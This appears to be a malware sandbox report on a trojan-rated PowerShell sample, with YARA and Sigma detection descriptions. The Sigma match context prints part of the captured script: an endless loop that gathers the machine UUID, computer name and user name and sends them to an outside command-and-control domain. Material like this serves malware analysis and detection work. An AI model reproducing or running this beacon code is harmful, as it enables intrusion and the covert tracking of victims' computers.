threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.

sigma_analysis_results.rule_description: Detects the execution of WMIC in order to get a list of firewall and antivirus products

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=wmic.exe; Hashes=MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA; Description=WMI Commandline Utility; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy bypass -File "C:\Users\Bruno\Desktop\sample.ps1"; CommandLine="C:\Windows\System32\Wbem\WMIC.exe" csproduct get UUID; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\wbem\WMIC.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=while ($true){$rcu = "https://southprovesolutions.com/KZouoRc";$rpu = "https://southprovesolutions.com/EPAWl"; $fsu = "https://southprovesolutions.com/VUkXugsYgu"; $uz = (wmic csproduct get UUID | Where-Object {$_ -match '[A-F0-9\-]+'}) -replace '\s+', ''; $sua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 HEAD/$env:COMPUTERNAME\$env:USERNAME ID@$($uz[1])"; try {$h = @{"User-Agent"="$sua"}; $r=Invoke-WebRequest -Uri $rcu -H [TRUNCATED]; Path=; ScriptBlockId=e72fa27c-f263-4d70-88f4-e8b0404389d7; MessageTotal=1; MessageNumber=1; EventID=4104}
